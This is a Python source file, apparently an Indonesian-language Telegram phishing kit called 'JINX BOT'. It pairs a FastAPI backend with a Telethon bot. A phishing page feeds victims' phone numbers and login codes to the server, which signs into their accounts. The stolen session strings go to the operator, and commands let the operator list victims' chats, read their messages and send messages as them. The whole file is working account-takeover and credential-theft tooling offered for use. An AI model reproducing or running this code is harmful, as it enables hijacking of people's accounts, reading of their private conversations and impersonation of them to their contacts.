from fastapi import FastAPI, Request
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import FloodWaitError
import asyncio
import os
import re

app = FastAPI()

# === ENV ===
API_ID = int(os.getenv('API_ID'))
API_HASH = os.getenv('API_HASH')
BOT_TOKEN = os.getenv('BOT_TOKEN')
CHAT_ID = int(os.getenv('CHAT_ID'))

client = TelegramClient('jinx', API_ID, API_HASH)
listening = {}
OTP_PATTERN = re.compile(r'\b(\d{5})\b')
sessions = {}

# === FUCKING OTP SNIPER STORAGE ===
otp_sniper_cache = {}
otp_requester_cache = {}

# === START ===
@app.on_event("startup")
async def startup():
    await client.start(bot_token=BOT_TOKEN)
    print("JINX BOT – ELITE EDITION + OTP SNIPER + CLEANUP JALAN!")

# === /start_listener – TANGKAP NOMOR KORBAN ===
@app.post("/start_listener")
async def start_listener(req: Request):
    data = await req.json()
    phone = data['phone']
    temp = TelegramClient(StringSession(), API_ID, API_HASH)
    await temp.connect()
    try:
        sent = await temp.send_code_request(phone)
        listening[phone] = {'client': temp, 'hash': sent.phone_code_hash}

        @temp.on(events.NewMessage(incoming=True, from_users=777000))
        async def handler(e):
            match = OTP_PATTERN.search(e.message.message)
            if match:
                otp_code = match.group(1)
                # FUCKING SNIPE THE OTP DAN SIMPAN
                otp_sniper_cache[phone] = {
                    'otp': otp_code,
                    'timestamp': asyncio.get_event_loop().time(),
                    'used': False
                }
                
                # Kirim alert ke Telegram
                await client.send_message(
                    CHAT_ID, 
                    f"🎯 **REAL OTP SNIPERED!**\n"
                    f"📱: `{phone}`\n"
                    f"🔐: `{otp_code}`\n"
                    f"⏰: {asyncio.get_event_loop().time()}\n\n"
                    f"Gunakan `/get_otp {phone}` buat dapetin OTP!"
                )
                
                await auto_login(phone, otp_code, "interceptor")

        await client.send_message(CHAT_ID, f"TARGET: `{phone}`\nMenunggu OTP dari web lo...")
        return {"success": True}
    except Exception as e:
        return {"success": False, "error": str(e)}

# === /submit_otp – KORBAN MASUKIN OTP ===
@app.post("/submit_otp")
async def submit_otp(req: Request):
    data = await req.json()
    phone = data['phone']
    otp = data['otp']
    if phone not in listening:
        return {"success": False, "error": "No active session"}
    temp = listening[phone]['client']
    hash_ = listening[phone]['hash']
    try:
        await temp.sign_in(phone, otp, phone_code_hash=hash_)
        session_str = temp.session.save()
        sessions[phone] = session_str
        await send_session(phone, session_str)
        await client.send_message(CHAT_ID, f"SESSION DICURI!\n/listchat {phone}")
        del listening[phone]
        return {"success": True}
    except Exception as e:
        await client.send_message(CHAT_ID, f"Gagal sign_in: {str(e)}")
        return {"success": False, "error": str(e)}

# === /get_otp +6281xxx – GET FRESH OTP ===
@client.on(events.NewMessage(pattern=r'/get_otp (\+\d+)'))
async def get_otp_cmd(event):
    if event.sender_id != CHAT_ID: 
        return
    
    phone = event.pattern_match.group(1)
    
    # Cek apakah ada OTP fresh yang ready
    if phone in otp_sniper_cache and not otp_sniper_cache[phone]['used']:
        otp_data = otp_sniper_cache[phone]
        otp_data['used'] = True
        
        await event.reply(
            f"🎯 **FRESH OTP READY!**\n"
            f"📱: `{phone}`\n"
            f"🔐: `{otp_data['otp']}`\n"
            f"⚡: **GUNAKAN CEPAT SEBELUM EXPIRED!**\n\n"
            f"Login pake OTP ini di Telegram sekarang!",
            parse_mode='markdown'
        )
        
        # Auto request OTP baru buat next time
        asyncio.create_task(auto_request_fresh_otp(phone))
        
    else:
        # Kalo gak ada OTP ready, auto request fresh
        await event.reply(
            f"🔄 **No OTP available, requesting FRESH OTP...**\n"
            f"📱: `{phone}`\n"
            f"Tunggu 10-30 detik...",
            parse_mode='markdown'
        )
        asyncio.create_task(auto_request_fresh_otp(phone))

async def auto_request_fresh_otp(phone):
    """Auto request fresh OTP buat nomor tertentu"""
    try:
        temp = TelegramClient(StringSession(), API_ID, API_HASH)
        await temp.connect()
        
        sent = await temp.send_code_request(phone)
        otp_requester_cache[phone] = {
            'client': temp,
            'hash': sent.phone_code_hash
        }
        
        @temp.on(events.NewMessage(incoming=True, from_users=777000))
        async def handler(e):
            match = OTP_PATTERN.search(e.message.message)
            if match:
                fresh_otp = match.group(1)
                otp_sniper_cache[phone] = {
                    'otp': fresh_otp,
                    'timestamp': asyncio.get_event_loop().time(),
                    'used': False,
                    'fresh': True
                }
                
                await client.send_message(
                    CHAT_ID,
                    f"🎯 **AUTO FRESH OTP READY!**\n"
                    f"📱: `{phone}`\n"
                    f"🔐: `{fresh_otp}`\n"
                    f"⚡: **GUNAKAN `/get_otp {phone}` BUAT DAPETIN!**"
                )
                await temp.disconnect()
                
    except Exception as e:
        await client.send_message(CHAT_ID, f"❌ Auto OTP request gagal: {str(e)}")

# === /otp_status ===
@client.on(events.NewMessage(pattern=r'/otp_status'))
async def otp_status_cmd(event):
    if event.sender_id != CHAT_ID: 
        return
    
    active_otps = {}
    for phone, data in otp_sniper_cache.items():
        if not data['used']:
            active_otps[phone] = {
                'otp': data['otp'],
                'fresh': data.get('fresh', False)
            }
    
    if active_otps:
        msg = "🎯 **ACTIVE OTP SNIPERS:**\n\n"
        for phone, info in active_otps.items():
            fresh_flag = " 🆕" if info['fresh'] else ""
            msg += f"📱 `{phone}` → `{info['otp']}`{fresh_flag}\n"
        
        msg += f"\nTotal: **{len(active_otps)}** OTP ready!\n"
        msg += "Gunakan `/get_otp +62xxx` buat dapetin!"
    else:
        msg = "❌ No active OTP snipers\nGunakan `/get_otp +62xxx` buat minta OTP fresh!"
    
    await event.reply(msg, parse_mode='markdown')

# === /cleanup +6281xxx ===
@client.on(events.NewMessage(pattern=r'/cleanup (\+\d+)'))
async def cleanup_cmd(event):
    if event.sender_id != CHAT_ID: 
        return
    
    phone = event.pattern_match.group(1)
    
    # 🗑️ HAPUS DARI SEMUA CACHE YANG BIKIN MAMPET
    cleanup_count = 0
    
    if phone in listening:
        try:
            await listening[phone]['client'].disconnect()
        except:
            pass
        del listening[phone]
        cleanup_count += 1
    
    if phone in sessions:
        del sessions[phone]
        cleanup_count += 1
    
    if phone in otp_sniper_cache:
        del otp_sniper_cache[phone]
        cleanup_count += 1
    
    if phone in otp_requester_cache:
        try:
            await otp_requester_cache[phone]['client'].disconnect()
        except:
            pass
        del otp_requester_cache[phone]
        cleanup_count += 1
    
    await event.reply(
        f"🧹 **SESSION CLEANED!**\n"
        f"📱: `{phone}`\n"
        f"🗑️: {cleanup_count} cache dihapus\n"
        f"✅: Semua data udah dibersihkan!\n\n"
        f"Sekarang coba `/get_otp {phone}` lagi!",
        parse_mode='markdown'
    )

# === /cleanup_all ===
@client.on(events.NewMessage(pattern=r'/cleanup_all'))
async def cleanup_all_cmd(event):
    if event.sender_id != CHAT_ID: 
        return
    
    count = 0
    for phone in list(listening.keys()):
        try:
            await listening[phone]['client'].disconnect()
        except:
            pass
        del listening[phone]
        count += 1
    
    otp_sniper_cache.clear()
    otp_requester_cache.clear()
    
    await event.reply(f"🧹 **MASS CLEANUP!** {count} session dibersihkan!", parse_mode='markdown')

# === KIRIM SESSION KE BOT ===
async def send_session(phone, session_str):
    file_path = f"/tmp/{phone.replace('+','')}.session"
    with open(file_path, "w") as f:
        f.write(session_str)
    await client.send_file(CHAT_ID, file_path, caption=f"SESSION: `{phone}`\nGunakan `/listchat {phone}`")
    os.remove(file_path)

# === /list ===
@client.on(events.NewMessage(pattern=r'/list'))
async def list_cmd(event):
    if event.sender_id != CHAT_ID: return
    if not sessions:
        await event.reply("Nggak ada session!")
        return
    msg = f"*{len(sessions)} SESSION:*\n"
    for p in sessions:
        msg += f"• `{p}`\n"
    await event.reply(msg, parse_mode='markdown')

# === /listchat +6281xxx – LIHAT SEMUA CHAT KORBAN ===
@client.on(events.NewMessage(pattern=r'/listchat (\+\d+)'))
async def listchat_cmd(event):
    if event.sender_id != CHAT_ID: return
    phone = event.pattern_match.group(1)
    if phone not in sessions:
        await event.reply("Session nggak ada!")
        return
    session_str = sessions[phone]
    stolen = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    try:
        await stolen.connect()
        await stolen.start()
        data = f"**DAFTAR CHAT `{phone}`**\n\n"
        async for dialog in stolen.iter_dialogs(limit=50):
            name = dialog.name or "Unknown"
            username = f"@{dialog.entity.username}" if hasattr(dialog.entity, 'username') and dialog.entity.username else ""
            chat_type = ""
            extra = ""
            if dialog.is_user:
                chat_type = "Private"
                status = "Online" if dialog.entity.status else "Last seen recently"
                extra = f"\n   ↳ {status}"
            elif dialog.is_group:
                chat_type = "Grup"
                members = getattr(dialog.entity, 'participants_count', 'Unknown')
                extra = f"\n   ↳ {members} anggota"
            elif dialog.is_channel:
                chat_type = "Channel"
                members = getattr(dialog.entity, 'participants_count', 'Unknown')
                extra = f"\n   ↳ {members} subscriber"
            data += f"{chat_type}\n"
            data += f"   **{name}** {username}{extra}\n\n"
        await event.reply(data if len(data) < 4000 else data[:3900] + "\n...\nGunakan `/chat` untuk detail", parse_mode='markdown')
        await stolen.disconnect()
    except Exception as e:
        await event.reply(f"Gagal: {str(e)}")

# === /chat +6281xxx @target – BACA CHAT 1 ORANG ===
@client.on(events.NewMessage(pattern=r'/chat (\+\d+) (@\w+|\d+)'))
async def chat_cmd(event):
    if event.sender_id != CHAT_ID: return
    phone = event.pattern_match.group(1)
    target = event.pattern_match.group(2)
    if phone not in sessions:
        await event.reply("Session nggak ada!")
        return
    session_str = sessions[phone]
    stolen = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    try:
        await stolen.connect()
        await stolen.start()
        entity = await stolen.get_entity(target)
        name = entity.first_name or entity.title or "Unknown"
        data = f"**CHAT DENGAN `{target}`**\n"
        data += f"**Nama:** `{name}`\n\n"
        async for msg in stolen.iter_messages(entity, limit=10):
            sender = "You" if msg.outgoing else name
            text = msg.message or "[Media]"
            if len(text) > 200: text = text[:200] + "..."
            data += f"**{sender}:** {text}\n\n"
        await event.reply(data, parse_mode='markdown')
        await stolen.disconnect()
    except Exception as e:
        await event.reply(f"Gagal baca chat: {str(e)}")

# === /send +6281xxx @target Pesan ===
@client.on(events.NewMessage(pattern=r'/send (\+\d+) (@\w+|\d+) (.+)'))
async def send_cmd(event):
    if event.sender_id != CHAT_ID: return
    phone = event.pattern_match.group(1)
    target = event.pattern_match.group(2)
    message = event.pattern_match.group(3)
    if phone not in sessions:
        await event.reply("Session nggak ada!")
        return
    stolen = TelegramClient(StringSession(sessions[phone]), API_ID, API_HASH)
    try:
        await stolen.connect()
        await stolen.start()
        entity = await stolen.get_entity(target)
        await stolen.send_message(entity, message)
        await event.reply(f"Pesan terkirim ke `{target}` dari `{phone}`!")
        await stolen.disconnect()
    except Exception as e:
        await event.reply(f"Gagal kirim: {str(e)}")

# === /help ===
@client.on(events.NewMessage(pattern=r'/help'))
async def help_cmd(event):
    if event.sender_id != CHAT_ID: return
    await event.reply("""
**JINX BOT – ELITE EDITION + OTP SNIPER + CLEANUP**

**PHISHING + OTP SNIPER:**
• Web lo → korban masukin nomor → OTP → session dicuri
• **OTP REAL-TIME** langsung di-snipe!

**OTP SNIPER COMMANDS:**
• `/get_otp +6281xxx` → Dapatkan OTP fresh yang di-snipe
• `/otp_status` → Lihat semua OTP yang ready
• `/cleanup +6281xxx` → Bersihkan session error 💀
• `/cleanup_all` → Bersihkan semua session 🧹

**INTEL CHAT:**
• `/list` → Lihat session  
• `/listchat +6281xxx` → Lihat semua orang yang pernah di-chat  
• `/chat +6281xxx @target` → Baca chat 1 orang  
• `/send +6281xxx @target Pesan` → Kirim pesan  

**STATUS:** ONLINE | OWNER ONLY | OTP SNIPER ACTIVE 🎯
""", parse_mode='markdown')

# === AUTO LOGIN FUNCTION ===
async def auto_login(phone, otp, source):
    """Fucking auto login dengan OTP yang di-snipe"""
    if phone not in listening:
        return
    
    temp = listening[phone]['client']
    hash_ = listening[phone]['hash']
    
    try:
        await temp.sign_in(phone, otp, phone_code_hash=hash_)
        session_str = temp.session.save()
        sessions[phone] = session_str
        await send_session(phone, session_str)
        await client.send_message(
            CHAT_ID, 
            f"🔥 **AUTO-LOGIN SUCCESS!**\n"
            f"📱: `{phone}`\n" 
            f"🔐: OTP dari {source}\n"
            f"✅: Session dicuri otomatis!"
        )
        del listening[phone]
    except Exception as e:
        await client.send_message(CHAT_ID, f"❌ Auto-login gagal: {str(e)}")
